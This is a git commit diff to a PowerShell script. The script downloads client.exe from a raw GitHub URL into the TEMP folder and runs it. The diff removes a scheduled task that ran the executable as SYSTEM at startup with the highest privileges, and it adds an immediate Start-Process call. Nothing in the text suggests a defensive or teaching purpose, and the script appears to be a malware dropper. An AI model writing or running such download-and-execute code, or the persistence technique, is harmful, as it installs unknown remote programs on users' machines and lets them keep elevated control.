3317a54cef1ee216bf55da4bb7ac8b3a9db30eba
Your Name <you@example.com>
2025-02-16 10:25:28 -0800

    'fx'

--- script-ps.ps1
+++ script-ps.ps1
@@ -9,14 +9,5 @@ $exeUrl = "https://github.com/a86782627/72628768/raw/refs/heads/master/client.ex
 $exePath = "$env:TEMP\client.exe"
 Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
 
-# Create a scheduled task to run the client.exe with elevated privileges
-$taskName = "RunClientWithElevatedPrivileges"
-$action = New-ScheduledTaskAction -Execute $exePath
-$trigger = New-ScheduledTaskTrigger -AtStartup
-$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable
-
-Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings
-
-# Run the scheduled task immediately
-Start-ScheduledTask -TaskName $taskName
+# Run the downloaded client.exe
+Start-Process $exePath
